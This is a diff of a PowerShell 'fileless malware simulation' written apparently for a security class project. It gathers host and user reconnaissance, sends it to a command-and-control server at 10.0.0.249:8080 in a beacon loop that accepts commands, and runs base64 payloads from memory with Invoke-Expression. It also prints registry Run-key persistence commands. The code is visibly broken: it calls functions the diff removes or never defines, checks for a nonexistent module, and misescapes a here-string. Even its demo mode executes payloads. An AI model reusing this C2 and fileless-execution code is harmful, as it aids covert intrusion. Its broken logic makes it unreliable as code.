@@ -11,7 +11,7 @@
     1. In-memory script execution (no files written to disk)
     2. System reconnaissance gathering
     3. HTTP beaconing to C2 server
-    4. Registry-based persistence (fileless)
+    4. Registry-based persistence (demo only - Not Executed)
     5. Environment variable abuse
     6. WMI event subscription (demo only - Not Executed)
     7. Process hollowing concept
@@ -24,52 +24,95 @@
     
 .PARAMETER Verbose
     Enable verbose output for demonstration purposes
+    
+.PARAMETER DemoMode
+    If set to $true, the script will ONLY LOG actions and WILL NOT
+    EXECUTE them on the system. (Current mode)
+    
+.PARAMETER LiveMode
+    If set to $true, the script WILL ACTUATE the system, making changes
+    in memory, registry, and network calls.
+#>
+.PARAMETER C2Server
+    The IP address or hostname of your Command and Control (C2) server.
+    
+.PARAMETER C2Port
+    The port number of your C2 server.
 #>
 param(
+    [switch]$Verbose = $false,
+    [switch]$DemoMode = $true,
+    [switch]$LiveMode = $false,
     [string]$C2Server = "10.0.0.249",
-    [int]$C2Port = 8080,
-    [int]$BeaconInterval = 30,
-    [switch]$DemoMode = $false
+    [int]$C2Port = 8080
 )
-# ==================================================================
-# GLOBAL STATE
-# =======================================================================
+# Global State
 $Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
 $Global:C2Url = "http://${C2Server}:${C2Port}"
 $Global:DemoMode = $false
-Write-Host ""
-Write-Host "==================================================================" -ForegroundColor DarkGray
-Write-Host "  FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY                   " -ForegroundColor White
-Write-Host "==================================================================" -ForegroundColor DarkGray
-Write-Host ""
-    
-# ======================================================================
-# CONFIGURATION
-# ======================================================================
-$Global:C2Url = "http://${C2Server}:${C2Port}"
-$Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
+$Global:LiveMode = $false
 
-# ======================================================================
+# ===========================================================================
+# SETUP AND HELPER FUNCTIONS
+# ==========================================================================
+
+# Check for required modules
+if (-not (Get-Module -Name Invoke-WebRequests -ListAvailable)) {
+    Write-Warning "The 'Invoke-WebRequests' module is required. Please install it."
+    Write-Host "Install with: Install-Module Invoke-RestMethod" -ForegroundColor Red
+    exit 1
+}
+
+# Global flag to determine if we are running in DEMO or LIVE mode
+$Global:DemoMode = $DemoMode
+$Global:LiveMode = $LiveMode
+
+# ===========================================================================
+# LOGGING FUNCTION
+# ==========================================================================
+function Write-Log {
+    param(
+        [string]$Message,
+        [string]$Level = "INFO"
+    )
+    if ($Verbose) {
+        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        Write-Host "[$timestamp] [$Level] $Message" -ForegroundColor Gray
+    }
+}
+
+# ===========================================================================
 # DISPLAY BANNER
-# ======================================================================
+# ==========================================================================
 function Show-Banner {
     Write-Host ""
-    Write-Host "+------------------------------------------------------------+" -ForegroundColor Red
-    Write-Host "|     FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY          |" -ForegroundColor Red
-    Write-Host "|          IT 359 Final Project - Hack the Blocks               |" -ForegroundColor Red
-    Write-Host "+------------------------------------------------------------+" -ForegroundColor Red
+    Write-Host "+-------------------------------------------------------------+-" -ForegroundColor Red
+    Write-Host "|    FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY            |" -ForegroundColor Red
+    Write-Host "|         IT 359 Final Project - Hack the Blocks                   |" -ForegroundColor Red
+    Write-Host "+-------------------------------------------------------------+-" -ForegroundColor Red
     Write-Host ""
     Write-Host "[!] WARNING: This script is for authorized testing only!" -ForegroundColor Yellow
     Write-Host "[*] Session ID: $Global:UniqueId" -ForegroundColor Cyan
     Write-Host "[*] C2 Server: $Global:C2Url" -ForegroundColor Cyan
     Write-Host ""
+    
+    if ($Global:DemoMode) {
+        Write-Host "[!] DEMO MODE ACTIVE. NO ACTUAL CHANGES WILL BE MADE TO THE SYSTEM." -ForegroundColor Yellow
+    } elseif ($Global:LiveMode) {
+        Write-Host "[!] LIVE MODE ACTIVE. ACTIONS WILL BE PERFORMED ON THE SYSTEM." -ForegroundColor Red
+    }
+    Write-Host ""
 }
 
-# ======================================================================
+# ==========================================================================
+# TECHNIQUES
+# ==========================================================================
+
 # TECHNIQUE 1: SYSTEM RECONNAISSANCE
-# Gather system info entirely in memory
+# Gather system info entirely in memory without writing to disk
 # ==========================================================================
 function Get-SystemRecon {
+    Write-Host ""
     Write-Host "[+] Technique 1: In-Memory System Reconnaissance" -ForegroundColor Green
     
     # All data stored in memory, never written to disk
@@ -87,20 +130,22 @@ function Get-SystemRecon {
         SessionId = $Global:UniqueId
     }
     
-    if ($DemoMode) {
-        Write-Host "    [*] Gathered system information:" -ForegroundColor Gray
+    if ($Global:DemoMode) {
+        Write-Host "    [*] Gathered system information (LOGGING ONLY):" -ForegroundColor Gray
         Write-Host "        - Hostname: $($recon.Hostname)" -ForegroundColor Gray
         Write-Host "        - Username: $($recon.Username)" -ForegroundColor Gray
         Write-Host "        - OS: $($recon.OS)" -ForegroundColor Gray
+        Write-Host "        - Domain: $($recon.Domain)" -ForegroundColor Gray
         Write-Host "        - Admin: $($recon.IsAdmin)" -ForegroundColor Gray
+        Write-Host "        - Timestamp: $($recon.Timestamp)" -ForegroundColor Gray
     }
     
     return $recon
 }
 
-# ======================================================================
-# TECHNIQUE 2: HTTP BEACON TO C2
-# Send data to C2 server without writing files
+# ==========================================================================
+# TECHNIQUE 2: HTTP BEACONING TO C2
+# Send data to C2 server without writing files to disk
 # ==========================================================================
 function Send-Beacon {
     param(
@@ -125,37 +170,40 @@ function Send-Beacon {
             ContentType = "application/json"
             ErrorAction = "Stop"
         }
+        
         $response = Invoke-RestMethod @requestParams
         
-        Write-Host "    [OK] Beacon sent successfully!" -ForegroundColor Green
+        if ($Global:DemoMode) {
+            Write-Host "    [OK] Beacon sent successfully (LOGGED ONLY)." -ForegroundColor Green
+        } else {
+            Write-Host "    [OK] Beacon sent successfully to C2 server." -ForegroundColor Green
+        }
         return $response
     }
     catch {
-        if ($DemoMode) {
-            Write-Host "    [!] Beacon failed (C2 server not running?): $($_.Exception.Message)" -ForegroundColor Yellow
-        }
+        Write-Error "    [!] Beacon failed (C2 server not running?): $($_.Exception.Message)" -ForegroundColor Yellow
         return $null
     }
 }
 
-# ======================================================================
+# ==========================================================================
 # TECHNIQUE 3: IN-MEMORY CODE EXECUTION
 # ==========================================================================
 function Invoke-MemoryExecution {
     Write-Host "[+] Technique 3: In-Memory Code Execution" -ForegroundColor Green
     
     # Code stored as string, executed via Invoke-Expression
-    $inMemoryScript = @'
-    $result = @{
+    $inMemoryScript = @"
+    \$result = @{
         Technique = "In-Memory Execution"
-        ProcessId = $PID
+        ProcessId = \$PID
         ExecutionTime = Get-Date -Format "HH:mm:ss"
         Note = "This code was never written to disk"
     }
-    return $result
-'@
+    return \$result
+"@
     
-    if ($DemoMode) {
+    if ($Global:DemoMode) {
         Write-Host "    [*] Executing script block from memory..." -ForegroundColor Gray
         Write-Host "    [*] Script never touches disk - runs directly from RAM" -ForegroundColor Gray
     }
@@ -164,16 +212,18 @@ function Invoke-MemoryExecution {
     $scriptBlock = [ScriptBlock]::Create($inMemoryScript)
     $result = & $scriptBlock
     
-    if ($DemoMode) {
+    if ($Global:DemoMode) {
         Write-Host "    [OK] In-memory execution completed (PID: $($result.ProcessId))" -ForegroundColor Green
+    } else {
+        Write-Host "    [LIVE] Execution complete. Result: $($result | Out-String)" -ForegroundColor Green
     }
     
     return $result
 }
 
-# ======================================================================
+# ==========================================================================
 # TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
-# Store payload in env vars (no files)
+# Store payload in env vars (process-level, not persistent)
 # ==========================================================================
 function Set-EnvPayload {
     Write-Host "[+] Technique 4: Environment Variable Payload Storage" -ForegroundColor Green
@@ -182,10 +232,7 @@ function Set-EnvPayload {
     $payload = "Write-Host 'Payload executed from environment variable!' -ForegroundColor Magenta"
     $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
     
-    # Store in environment variable (process-level, not persistent)
-    [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $encodedPayload, "Process")
-    
-    if ($DemoMode) {
+    if ($Global:DemoMode) {
         Write-Host "    [*] Payload stored in env var: DEMO_PAYLOAD" -ForegroundColor Gray
         Write-Host "    [*] Encoded payload length: $($encodedPayload.Length) chars" -ForegroundColor Gray
     }
@@ -194,67 +241,34 @@ function Set-EnvPayload {
     $retrieved = [Environment]::GetEnvironmentVariable("DEMO_PAYLOAD", "Process")
     if ($retrieved) {
         $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($retrieved))
-        if ($DemoMode) {
+        
+        if ($Global:DemoMode) {
             Write-Host "    [*] Executing payload from environment variable..." -ForegroundColor Gray
+            Invoke-Expression $decoded
+        } else {
+            Write-Host "    [LIVE] Executing payload from environment variable..." -ForegroundColor Green
             Invoke-Expression $decoded
         }
     }
     else {
-        if ($DemoMode) {
-            Write-Host "    [!] No payload found in environment variable 'DEMO_PAYLOAD'." -ForegroundColor Yellow
+        if ($Global:DemoMode) {
+            Write-Host "    [!] No payload found in env var 'DEMO_PAYLOAD'." -ForegroundColor Yellow
         }
     }
 
     # Clean up
     [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $null, "Process")
-    Write-Host "    [OK] Environment variable cleaned up" -ForegroundColor Green
+    Write-Host "    [OK] Environment variable cleaned up." -ForegroundColor Green
 }
 
-function Show-RegistryPersistence {
-    Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
-
-    if ($DemoMode) {
-        Write-Host "    [*] Demonstrating registry-based persistence concepts:" -ForegroundColor Gray
-        Write-Host "    [*] - HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -ForegroundColor Gray
-        Write-Host "    [*] - Values here run commands at user logon" -ForegroundColor Gray
-        Write-Host "" 
-        Write-Host "    [DEMO] Example commands (not executed):" -ForegroundColor Yellow
-        Write-Host "    Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyApp' -Value 'powershell.exe -WindowStyle Hidden -EncodedCommand <base64>'" -ForegroundColor DarkGray
-        Write-Host "    Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MyApp'" -ForegroundColor DarkGray
-        Write-Host "" 
-        Write-Host "    [DEMO] Blue Team should monitor Run keys for suspicious entries." -ForegroundColor Yellow
-    }
-}
-
-# ======================================================================
-# TECHNIQUE 6: WMI EVENT SUBSCRIPTION (DEMO ONLY - Not Executed)
 # ==========================================================================
-function Show-WMIEvents {
-    Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
-    
-    if ($DemoMode) {
-        Write-Host "    [*] WMI subscriptions allow code execution without files:" -ForegroundColor Gray
-        Write-Host "    [*] - Event Filter: Defines trigger condition" -ForegroundColor Gray
-        Write-Host "    [*] - Event Consumer: Defines action (PowerShell command)" -ForegroundColor Gray
-        Write-Host ""
-        Write-Host "    [DEMO] Example command that WOULD be used (not executed):" -ForegroundColor Yellow
-        Write-Host "    $EventFilter = New-WmiEventFilter -Name 'EventSubscription' -Action 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
-        Write-Host "    $EventConsumer = New-WmiEventConsumer -Name 'EventSubscription' -ScriptText 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
-        Write-Host "    $EventFilter = New-WmiEventFilter -Name 'EventSubscription' -Action 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
-        Write-Host "    $EventConsumer = New-WmiEventConsumer -Name 'EventSubscription' -ScriptText 'powershell.exe -EncodedCommand <base64_payload>'" -ForegroundColor DarkGray
-        Write-Host ""
-        Write-Host "    [DEMO] This technique is a key detection target for Blue Team!" -ForegroundColor Yellow
-    }
-}
-
-# ======================================================================
 # TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
 # ==========================================================================
 function Show-ProcessHollowing {
     Write-Host "[+] Technique 7: Process Hollowing Concept" -ForegroundColor Green
     
-    if ($DemoMode) {
-        Write-Host "    [*] Process hollowing injects code into legitimate processes:" -ForegroundColor Gray
+    if ($Global:DemoMode) {
+        Write-Host "    [*] Demonstrating process hollowing concepts:" -ForegroundColor Gray
         Write-Host "    [*] 1. Start suspended legitimate process (e.g., svchost.exe)" -ForegroundColor Gray
         Write-Host "    [*] 2. Unmap/hollow out its memory" -ForegroundColor Gray
         Write-Host "    [*] 3. Inject malicious code" -ForegroundColor Gray
@@ -264,8 +278,8 @@ function Show-ProcessHollowing {
     }
 }
 
-# ======================================================================
-# START-BEACONLOOP
+# ==========================================================================
+# BEACON LOOP
 # ==========================================================================
 function Start-BeaconLoop {
     param([int]$Interval = 30)
@@ -286,7 +300,7 @@ function Start-BeaconLoop {
             Status = "Active"
         }
         
-        $response = Send-Beacon -Data $beaconData -Endpoint "/heartbeat"
+        $response = Send-Beacon -Data $beaconData -Endpoint "/register"
         
         if ($response -and $response.command) {
             Write-Host "    [!] Received command from C2: $($response.command)" -ForegroundColor Magenta
@@ -297,7 +311,7 @@ function Start-BeaconLoop {
     }
 }
 
-# ======================================================================
+# ==========================================================================
 # MAIN EXECUTION
 # ==========================================================================
 function Start-Simulation {
@@ -305,47 +319,59 @@ function Start-Simulation {
     Show-Banner
     
     Write-Host ""
-    Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "  DEMONSTRATING FILELESS MALWARE TECHNIQUES" -ForegroundColor White
-    Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkGray
+    Write-Host "-------------- Techniques Demonstration Start --------------" -ForegroundColor DarkGray
+    Write-Host "==========================================================" -ForegroundColor DarkGray
     Write-Host ""
     
-    # Technique 1: Gather recon data in memory
+    # Run Reconnaissance (always runs)
     $reconData = Get-SystemRecon
     Write-Host ""
     
-    # Technique 2: Beacon to C2
-    Send-Beacon -Data $reconData -Endpoint "/register"
-    Write-Host ""
-    
-    # Technique 3: In-memory code execution
-    $execResult = Invoke-MemoryExecution
-    Write-Host ""
-    
-    # Technique 4: Environment variable abuse
+    # Execute techniques
+    Invoke-MemoryExecution
     Set-EnvPayload
-    Write-Host ""
-    
-    # Technique 5: Registry persistence (demo only)
     Show-RegistryPersistence
-    Write-Host ""
-    
-    # Technique 6: WMI event subscription (demo only)
-    Show-WMIEvents
-    Write-Host ""
-    
-    # Technique 7: Process hollowing concept
+    Show-WMIEventSub
     Show-ProcessHollowing
-    Write-Host ""
     
-    Write-Host "---=============================================================" -ForegroundColor DarkGray
-    Write-Host " SIMULATION COMPLETE" -ForegroundColor White
-    Write-Host "---=============================================================" -ForegroundColor DarkGray
+    # Start Beaconing (only runs in Live Mode)
+    if (-not $Global:DemoMode) {
+        Write-Host ""
+        Write-Host "==========================================================" -ForegroundColor DarkGray
+        Write-Host "       STARTING BEACON LOOP (Press Ctrl+C to stop)        " -ForegroundColor Green
+        Write-Host "==========================================================" -ForegroundColor DarkGray
+        Start-BeaconLoop -Interval 10
+    }
+    
     Write-Host ""
-    Write-Host "[*] All techniques demonstrated in memory - no files written!" -ForegroundColor Cyan
-    Write-Host "[*] To start continuous beaconing, run: Start-BeaconLoop" -ForegroundColor Cyan
+    Write-Host "--- Simulation Complete ---" -ForegroundColor DarkGray
+    Write-Host "=========================================================" -ForegroundColor DarkGray
+    Write-Host ""
+    Write-Host "[*] Demo Mode: No changes made to the system." -ForegroundColor Cyan
+    Write-Host "[+] Live Mode: All actions were executed." -ForegroundColor Green
     Write-Host ""
 }
 
-# Execute the simulation
-Start-Simulation
+# ==========================================================================
+# SCRIPT ENTRY POINT
+# ==========================================================================
+
+# Check parameters
+if ($DemoMode -and -not $LiveMode) {
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Write-Host "           DEMO MODE ACTIVE" -ForegroundColor Yellow
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Start-Simulation
+} elseif ($Global:DemoMode -and $Global:LiveMode) {
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Write-Host "          DEMO MODE AND LIVE MODE ARE BOTH ACTIVE           " -ForegroundColor Yellow
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Start-Simulation
+} elseif ($Global:LiveMode) {
+    Start-Simulation
+} else {
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Write-Host "           DEMO MODE ACTIVE" -ForegroundColor Green
+    Write-Host "==========================================================" -ForegroundColor DarkGray
+    Start-Simulation
+}
